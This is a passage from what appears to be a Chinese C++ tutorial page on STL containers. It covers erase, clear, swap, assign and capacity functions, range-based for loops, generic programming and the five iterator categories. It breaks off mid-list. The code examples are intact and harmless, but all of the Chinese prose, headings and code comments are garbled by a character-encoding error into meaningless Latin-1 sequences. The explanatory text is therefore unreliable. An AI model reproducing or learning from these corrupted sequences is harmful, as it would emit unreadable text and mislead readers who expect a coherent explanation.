<code>erase(iterator pos)</code>: åˆ é™¤ <code>pos</code> æŒ‡å‘çš„å…ƒç´ ã€‚è¿”å›æŒ‡å‘è¢«åˆ é™¤å…ƒç´ ä¹‹åå…ƒç´ çš„è¿­ä»£å™¨ã€‚</li><li>  <code>erase(iterator first, iterator last)</code>: åˆ é™¤èŒƒå›´ <code>[first, last)</code> å†…çš„å…ƒç´ ã€‚è¿”å›æŒ‡å‘æœ€åä¸€ä¸ªè¢«åˆ é™¤å…ƒç´ ä¹‹åå…ƒç´ çš„è¿­ä»£å™¨ã€‚</li></ul></li><li><p>  <strong>æ¸…ç©º (<code>clear()</code>):</strong> åˆ é™¤å®¹å™¨ä¸­çš„æ‰€æœ‰å…ƒç´ ã€‚<code>size()</code> å˜ä¸º 0ã€‚</p></li><li><p>  <strong>äº¤æ¢ (<code>swap()</code>):</strong> <code>c1.swap(c2)</code> æˆ– <code>std::swap(c1, c2)</code>ã€‚é«˜æ•ˆåœ°äº¤æ¢ä¸¤ä¸ªå®¹å™¨çš„å†…å®¹ã€‚å¯¹äº <code>vector</code> ç­‰å®¹å™¨ï¼Œé€šå¸¸åªäº¤æ¢å†…éƒ¨æŒ‡é’ˆå’Œå¤§å°ä¿¡æ¯ï¼Œé€Ÿåº¦å¾ˆå¿«ã€‚</p></li><li><p><strong>èµ‹å€¼ (<code>assign()</code>):</strong> æ›¿æ¢å®¹å™¨çš„å…¨éƒ¨å†…å®¹ã€‚</p><ul><li>  <code>assign(size_type n, const value_type&amp; val)</code>: èµ‹å€¼ä¸º <code>n</code> ä¸ª <code>val</code>ã€‚</li><li>  <code>assign(InputIt first, InputIt last)</code>: èµ‹å€¼ä¸ºæ¥è‡ªè¿­ä»£å™¨èŒƒå›´ <code>[first, last)</code> çš„å…ƒç´ ã€‚</li><li>  <code>assign(initializer_list&lt;value_type&gt; il)</code> (C++11): ä»åˆå§‹åŒ–åˆ—è¡¨èµ‹å€¼ã€‚</li></ul></li><li><p><strong>å®¹é‡ç®¡ç† (ä¸»è¦ç”¨äº <code>vector</code>, <code>string</code>, <code>deque</code>):</strong></p><ul><li>  <code>capacity()</code>: è¿”å›å½“å‰å·²åˆ†é…å†…å­˜èƒ½å¤Ÿå®¹çº³çš„å…ƒç´ æ•°é‡ã€‚</li><li>  <code>reserve(n)</code>: è¯·æ±‚å°†å®¹é‡å¢åŠ åˆ°è‡³å°‘ <code>n</code>ã€‚å¦‚æœ <code>n</code> å¤§äºå½“å‰å®¹é‡ï¼Œå¯èƒ½å‘ç”Ÿå†…å­˜é‡æ–°åˆ†é…ï¼ˆè¿™ä¼šå¯¼è‡´æ‰€æœ‰è¿­ä»£å™¨ã€æŒ‡é’ˆå’Œå¼•ç”¨å¤±æ•ˆï¼‰ã€‚</li><li>  <code>shrink_to_fit()</code> (C++11): è¯·æ±‚å‡å°‘å®¹é‡ä»¥åŒ¹é… <code>size()</code>ã€‚ä¸ä¿è¯ä¸€å®šå‡å°‘ã€‚</li></ul></li></ul><p><strong>ç¤ºä¾‹ (ä½¿ç”¨è¿­ä»£å™¨):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–è¿­ä»£å™¨</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::iterator it = v.begin(); <span class="comment">// æŒ‡å‘ 10</span></span><br><span class="line">    it += <span class="number">2</span>; <span class="comment">// ç§»åŠ¨è¿­ä»£å™¨ï¼ŒæŒ‡å‘ 30 (vector æ”¯æŒéšæœºè®¿é—®è¿­ä»£å™¨)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ’å…¥</span></span><br><span class="line">    v.insert(it, <span class="number">25</span>); <span class="comment">// åœ¨ 30 ä¹‹å‰æ’å…¥ 25ã€‚v: &#123;10, 20, 25, 30, 40, 50&#125;</span></span><br><span class="line">                      <span class="comment">// æ³¨æ„ï¼švector æ’å…¥å¯èƒ½å¯¼è‡´è¿­ä»£å™¨å¤±æ•ˆï¼Œæœ€å¥½é‡æ–°è·å–æˆ–ä½¿ç”¨è¿”å›çš„è¿­ä»£å™¨</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After insert: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> x : v) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ é™¤</span></span><br><span class="line">    it = v.begin() + <span class="number">1</span>; <span class="comment">// æŒ‡å‘ 20</span></span><br><span class="line">    v.erase(it); <span class="comment">// åˆ é™¤ 20ã€‚v: &#123;10, 25, 30, 40, 50&#125;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After erase(it): &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> x : v) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    it = v.begin() + <span class="number">1</span>; <span class="comment">// æŒ‡å‘ 25</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::iterator it_end = v.begin() + <span class="number">3</span>; <span class="comment">// æŒ‡å‘ 40 (èŒƒå›´æ˜¯ [it, it_end) )</span></span><br><span class="line">    v.erase(it, it_end); <span class="comment">// åˆ é™¤ 25, 30ã€‚v: &#123;10, 40, 50&#125;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After erase(range): &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> x : v) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ assign</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; l = &#123;<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>&#125;;</span><br><span class="line">    v.assign(l.begin(), l.end()); <span class="comment">// ç”¨ list çš„å†…å®¹æ›¿æ¢ vector å†…å®¹ã€‚v: &#123;100, 200, 300&#125;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After assign: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> x : v) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    v.clear(); <span class="comment">// æ¸…ç©º vector</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After clear, size is: &quot;</span> &lt;&lt; v.size() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="16-3-4-åŸºäºèŒƒå›´çš„-for-å¾ªç¯ï¼ˆC-11ï¼‰"><a href="#16-3-4-åŸºäºèŒƒå›´çš„-for-å¾ªç¯ï¼ˆC-11ï¼‰" class="headerlink" title="16.3.4 åŸºäºèŒƒå›´çš„ for å¾ªç¯ï¼ˆC++11ï¼‰"></a>16.3.4 åŸºäºèŒƒå›´çš„ for å¾ªç¯ï¼ˆC++11ï¼‰</h3><p>C++11 å¼•å…¥äº†ä¸€ç§æ›´ç®€æ´ã€æ›´ä¸æ˜“å‡ºé”™çš„éå†å®¹å™¨ï¼ˆä»¥åŠå…¶ä»–æ”¯æŒ <code>begin()</code> å’Œ <code>end()</code> çš„åºåˆ—ï¼‰çš„æ–¹å¼ï¼š**åŸºäºèŒƒå›´çš„ for å¾ªç¯ (Range-based for loop)**ã€‚</p><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( declaration : range_expression ) &#123;</span><br><span class="line">    <span class="comment">// loop_statement</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>range_expression</code>: ä¸€ä¸ªå¯ä»¥æä¾› <code>begin()</code> å’Œ <code>end()</code> è¿­ä»£å™¨çš„å¯¹è±¡ï¼ˆå¦‚ STL å®¹å™¨ã€æ•°ç»„ã€åˆå§‹åŒ–åˆ—è¡¨ï¼Œæˆ–å®šä¹‰äº†ç›¸åº”æˆå‘˜/éæˆå‘˜å‡½æ•°çš„è‡ªå®šä¹‰ç±»å‹ï¼‰ã€‚</li><li>  <code>declaration</code>: å£°æ˜ä¸€ä¸ªå˜é‡ï¼Œå…¶ç±»å‹åº”ä¸ <code>range_expression</code> ä¸­çš„å…ƒç´ ç±»å‹å…¼å®¹ã€‚æ¯æ¬¡å¾ªç¯è¿­ä»£ï¼Œ<code>range_expression</code> ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ä¼šè¢«<strong>å¤åˆ¶</strong>æˆ–<strong>å¼•ç”¨</strong>åˆ°è¿™ä¸ªå˜é‡ä¸­ã€‚</li></ul><p><strong>å¸¸ç”¨å½¢å¼:</strong></p><ul><li><strong>åªè¯»è®¿é—® (æ¨è):</strong> ä½¿ç”¨ <code>const auto&amp;</code> é¿å…ä¸å¿…è¦çš„å¤åˆ¶ï¼Œå¹¶ç¡®ä¿ä¸ä¼šæ„å¤–ä¿®æ”¹å…ƒç´ ã€‚  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; names = &#123;<span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Charlie&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; name : names) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; name &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¾“å‡º: Alice Bob Charlie</span></span><br></pre></td></tr></table></figure></li><li><strong>ä¿®æ”¹å…ƒç´ :</strong> ä½¿ç”¨ <code>auto&amp;</code> è·å–å…ƒç´ çš„å¼•ç”¨ï¼Œå…è®¸åœ¨å¾ªç¯ä¸­ä¿®æ”¹å®¹å™¨å†…å®¹ã€‚  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; nums = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span>&amp; num : nums) &#123;</span><br><span class="line">    num *= <span class="number">2</span>; <span class="comment">// å°†æ¯ä¸ªå…ƒç´ ä¹˜ä»¥ 2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// nums ç°åœ¨æ˜¯ &#123;2, 4, 6, 8&#125;</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; num : nums) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; num &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¾“å‡º: 2 4 6 8</span></span><br></pre></td></tr></table></figure></li><li><strong>å¤åˆ¶å…ƒç´ :</strong> ä½¿ç”¨ <code>auto</code> (æˆ–å…·ä½“ç±»å‹) ä¼šå°†æ¯ä¸ªå…ƒç´ <strong>å¤åˆ¶</strong>åˆ°å¾ªç¯å˜é‡ä¸­ã€‚å¯¹å¾ªç¯å˜é‡çš„ä¿®æ”¹<strong>ä¸ä¼š</strong>å½±å“å®¹å™¨ä¸­çš„åŸå§‹å…ƒç´ ã€‚  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; data = &#123;<span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> val : data) &#123;</span><br><span class="line">    val += <span class="number">1</span>; <span class="comment">// åªä¿®æ”¹äº†å‰¯æœ¬ valï¼Œdata ä¸å˜</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; val &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// è¾“å‡º 6 11 16</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; d : data) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; d &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// è¾“å‡º 5 10 15 (åŸå§‹æ•°æ®æœªå˜)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure></li></ul><p>åŸºäºèŒƒå›´çš„ for å¾ªç¯æå¤§åœ°ç®€åŒ–äº†éå†å®¹å™¨çš„ä»£ç ï¼Œä½¿å…¶æ›´æ˜“è¯»ã€æ›´å®‰å…¨ï¼ˆé¿å…äº†è¿­ä»£å™¨å¤±æ•ˆæˆ–ç´¢å¼•è¶Šç•Œç­‰å¸¸è§é”™è¯¯ï¼‰ã€‚</p><h2 id="16-4-æ³›å‹ç¼–ç¨‹"><a href="#16-4-æ³›å‹ç¼–ç¨‹" class="headerlink" title="16.4 æ³›å‹ç¼–ç¨‹"></a>16.4 æ³›å‹ç¼–ç¨‹</h2><p><strong>æ³›å‹ç¼–ç¨‹ (Generic Programming)</strong> æ˜¯ä¸€ç§ç¼–ç¨‹èŒƒå¼ï¼Œæ—¨åœ¨ç¼–å†™ç‹¬ç«‹äºç‰¹å®šæ•°æ®ç±»å‹çš„ä»£ç ã€‚å…¶ç›®æ ‡æ˜¯åˆ›å»ºå¯é‡ç”¨çš„ç»„ä»¶ï¼ˆå¦‚å‡½æ•°æˆ–ç±»ï¼‰ï¼Œè¿™äº›ç»„ä»¶å¯ä»¥å¤„ç†å¤šç§ä¸åŒçš„æ•°æ®ç±»å‹ï¼Œè€Œæ— éœ€ä¸ºæ¯ç§ç±»å‹é‡å†™ä»£ç ã€‚C++ ä¸­çš„<strong>æ¨¡æ¿ (Templates)</strong> æ˜¯å®ç°æ³›å‹ç¼–ç¨‹çš„ä¸»è¦æœºåˆ¶ã€‚</p><p>æ ‡å‡†æ¨¡æ¿åº“ (STL) å°±æ˜¯æ³›å‹ç¼–ç¨‹æ€æƒ³çš„é›†ä¸­ä½“ç°ã€‚å®ƒé€šè¿‡æ¨¡æ¿å®šä¹‰äº†é€šç”¨çš„å®¹å™¨ã€ç®—æ³•å’Œè¿­ä»£å™¨ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥ç”¨åŒæ ·çš„æ–¹å¼æ“ä½œ <code>vector&lt;int&gt;</code>, <code>list&lt;string&gt;</code> æˆ–å…¶ä»–è‡ªå®šä¹‰ç±»å‹çš„æ•°æ®ã€‚</p><h3 id="16-4-1-ä¸ºä½•ä½¿ç”¨è¿­ä»£å™¨"><a href="#16-4-1-ä¸ºä½•ä½¿ç”¨è¿­ä»£å™¨" class="headerlink" title="16.4.1 ä¸ºä½•ä½¿ç”¨è¿­ä»£å™¨"></a>16.4.1 ä¸ºä½•ä½¿ç”¨è¿­ä»£å™¨</h3><p>STL çš„è®¾è®¡æ ¸å¿ƒæ˜¯å°†<strong>æ•°æ®å­˜å‚¨ï¼ˆå®¹å™¨ï¼‰</strong>å’Œ<strong>æ•°æ®æ“ä½œï¼ˆç®—æ³•ï¼‰</strong>åˆ†ç¦»å¼€æ¥ã€‚ä½†æ˜¯ï¼Œç®—æ³•å¦‚ä½•æ‰èƒ½è®¿é—®ä¸åŒå®¹å™¨ï¼ˆå¦‚ <code>vector</code>, <code>list</code>, <code>deque</code>ï¼‰ä¸­çš„æ•°æ®å‘¢ï¼Ÿä¸åŒçš„å®¹å™¨å†…éƒ¨ç»“æ„å¯èƒ½å®Œå…¨ä¸åŒã€‚</p><p><strong>è¿­ä»£å™¨ (Iterators)</strong> å°±æ˜¯è§£å†³è¿™ä¸ªé—®é¢˜çš„å…³é”®ã€‚è¿­ä»£å™¨æ˜¯ä¸€ç§<strong>æ³›åŒ–çš„æŒ‡é’ˆ</strong>ï¼Œå®ƒæä¾›äº†ä¸€ç§ç»Ÿä¸€çš„æ–¹å¼æ¥<strong>éå†</strong>å®¹å™¨ä¸­çš„å…ƒç´ ï¼Œå¹¶è®¿é—®å…ƒç´ çš„å€¼ï¼Œè€Œ<strong>æ— éœ€æš´éœ²å®¹å™¨çš„å†…éƒ¨å®ç°ç»†èŠ‚</strong>ã€‚</p><ul><li>  <strong>æŠ½è±¡è®¿é—®:</strong> ç®—æ³•ä¸ç›´æ¥æ“ä½œå®¹å™¨ï¼Œè€Œæ˜¯é€šè¿‡è¿­ä»£å™¨æ¥è®¿é—®å®¹å™¨ä¸­çš„å…ƒç´ èŒƒå›´ã€‚</li><li>  <strong>ç»Ÿä¸€æ¥å£:</strong> æ‰€æœ‰å®¹å™¨éƒ½æä¾›ç¬¦åˆç‰¹å®šæ ‡å‡†çš„è¿­ä»£å™¨æ¥å£ï¼ˆå¦‚ <code>begin()</code>, <code>end()</code>, <code>++</code> å‰è¿›, <code>*</code> è§£å¼•ç”¨ï¼‰ã€‚</li><li>  <strong>çµæ´»æ€§:</strong> ç®—æ³•åªéœ€è¦çŸ¥é“å¦‚ä½•ä½¿ç”¨è¿­ä»£å™¨ï¼Œå°±å¯ä»¥åº”ç”¨äºä»»ä½•æä¾›å…¼å®¹è¿­ä»£å™¨çš„å®¹å™¨ã€‚ä¾‹å¦‚ï¼Œ<code>std::sort</code> ç®—æ³•å¯ä»¥å¯¹ <code>vector</code>, <code>deque</code> ç”šè‡³æ™®é€šæ•°ç»„ï¼ˆé€šè¿‡æŒ‡é’ˆï¼ŒæŒ‡é’ˆä¹Ÿæ˜¯ä¸€ç§è¿­ä»£å™¨ï¼‰è¿›è¡Œæ’åºï¼Œåªè¦å®ƒä»¬æä¾›æ‰€éœ€çš„è¿­ä»£å™¨ç±»å‹ã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt; // for std::find</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; vec = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; lst = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> arr[] = &#123;<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>, <span class="number">400</span>, <span class="number">500</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> value_to_find = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">int</span> value_to_find_list = <span class="number">30</span>;</span><br><span class="line">    <span class="keyword">int</span> value_to_find_arr = <span class="number">300</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ std::find ç®—æ³•ï¼Œé€šè¿‡è¿­ä»£å™¨æ“ä½œä¸åŒå®¹å™¨</span></span><br><span class="line">    <span class="keyword">auto</span> it_vec = <span class="built_in">std</span>::find(vec.begin(), vec.end(), value_to_find);</span><br><span class="line">    <span class="keyword">if</span> (it_vec != vec.end()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Found &quot;</span> &lt;&lt; value_to_find &lt;&lt; <span class="string">&quot; in vector.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> it_lst = <span class="built_in">std</span>::find(lst.begin(), lst.end(), value_to_find_list);</span><br><span class="line">    <span class="keyword">if</span> (it_lst != lst.end()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Found &quot;</span> &lt;&lt; value_to_find_list &lt;&lt; <span class="string">&quot; in list.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ™®é€šæŒ‡é’ˆä¹Ÿå¯ä»¥ä½œä¸ºè¿­ä»£å™¨ä½¿ç”¨</span></span><br><span class="line">    <span class="keyword">int</span>* it_arr = <span class="built_in">std</span>::find(arr, arr + <span class="number">5</span>, value_to_find_arr);</span><br><span class="line">    <span class="keyword">if</span> (it_arr != arr + <span class="number">5</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Found &quot;</span> &lt;&lt; value_to_find_arr &lt;&lt; <span class="string">&quot; in array.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒåŒä¸€ä¸ª <code>std::find</code> ç®—æ³•å¯ä»¥ä½œç”¨äº <code>vector</code>, <code>list</code> å’Œ C é£æ ¼æ•°ç»„ï¼Œå› ä¸ºå®ƒæ“ä½œçš„æ˜¯è¿­ä»£å™¨ï¼ˆæˆ–æŒ‡é’ˆï¼‰å®šä¹‰çš„èŒƒå›´ï¼Œè€Œä¸æ˜¯å®¹å™¨æœ¬èº«ã€‚</p><h3 id="16-4-2-è¿­ä»£å™¨ç±»å‹"><a href="#16-4-2-è¿­ä»£å™¨ç±»å‹" class="headerlink" title="16.4.2 è¿­ä»£å™¨ç±»å‹"></a>16.4.2 è¿­ä»£å™¨ç±»å‹</h3><p>STL å®šä¹‰äº†äº”ç§ä¸»è¦çš„è¿­ä»£å™¨ç±»åˆ«ï¼Œå®ƒä»¬æ ¹æ®æä¾›çš„æ“ä½œèƒ½åŠ›è¿›è¡ŒåŒºåˆ†ï¼š</p><ol><li><p><strong>è¾“å…¥è¿­ä»£å™¨ (Input Iterator):</strong></p><ul><li>  æœ€åŸºæœ¬çš„è¿­ä»£å™¨ï¼Œåªèƒ½<strong>å‘å‰</strong>ç§»åŠ¨ (<code>++</code>)ã€‚</li><li>  åªèƒ½<strong>è¯»å–</strong> (<code>*</code>) æ‰€æŒ‡å‘çš„å…ƒç´ <strong>ä¸€æ¬¡</strong>ï¼ˆè¯»å–åå†æ¬¡è¯»å–åŒä¸€ä½ç½®çš„ç»“æœæœªå®šä¹‰ï¼‰ã€‚</li><li>  æ”¯æŒæ¯”è¾ƒç›¸ç­‰ (<code>==</code>, <code>!=</code>)ã€‚</li><li>  ç”¨äºå•éæ‰«æç®—æ³•ï¼Œä¾‹å¦‚ <code>std::find</code>, <code>std::accumulate</code>ã€‚<code>istream_iterator</code> æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</li></ul></li><li><p><strong>è¾“å‡ºè¿­ä»£å™¨ (Output Iterator):</strong></p><ul><li>  åªèƒ½<strong>å‘å‰</strong>ç§»åŠ¨ (<code>++</code>)ã€‚</li><li>  åªèƒ½<strong>å†™å…¥</strong> (<code>*it = value</code>) æ‰€æŒ‡å‘çš„ä½ç½®<strong>ä¸€æ¬¡</strong>ã€‚</li><li>  ä¸æ”¯æŒæ¯”è¾ƒã€‚</li><li>  ç”¨äºå°†ç»“æœå†™å…¥ç›®æ ‡ï¼Œä¾‹å¦‚ <code>std::copy</code> çš„ç¬¬ä¸‰ä¸ªå‚æ•°ã€‚<code>ostream_iterator</code> æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</li></ul></li><li><p><strong>å‰å‘è¿­ä»£å™¨ (Forward Iterator):</strong></p><ul><li>  ç»“åˆäº†è¾“å…¥å’Œè¾“å‡ºè¿­ä»£å™¨çš„éƒ¨åˆ†èƒ½åŠ›ï¼ˆä½†æ›´å¼ºï¼‰ã€‚</li><li>  å¯ä»¥<strong>å‘å‰</strong>ç§»åŠ¨ (<code>++</code>)ã€‚</li><li>  å¯ä»¥<strong>å¤šæ¬¡è¯»å–</strong> (<code>*</code>) åŒä¸€ä¸ªå…ƒç´ ã€‚</li><li>  å¯ä»¥<strong>å¤šæ¬¡å†™å…¥</strong> (<code>*it = value</code>) åŒä¸€ä¸ªå…ƒç´ ï¼ˆå¦‚æœæŒ‡å‘çš„æ˜¯é <code>const</code> å…ƒç´ ï¼‰ã€‚</li><li>  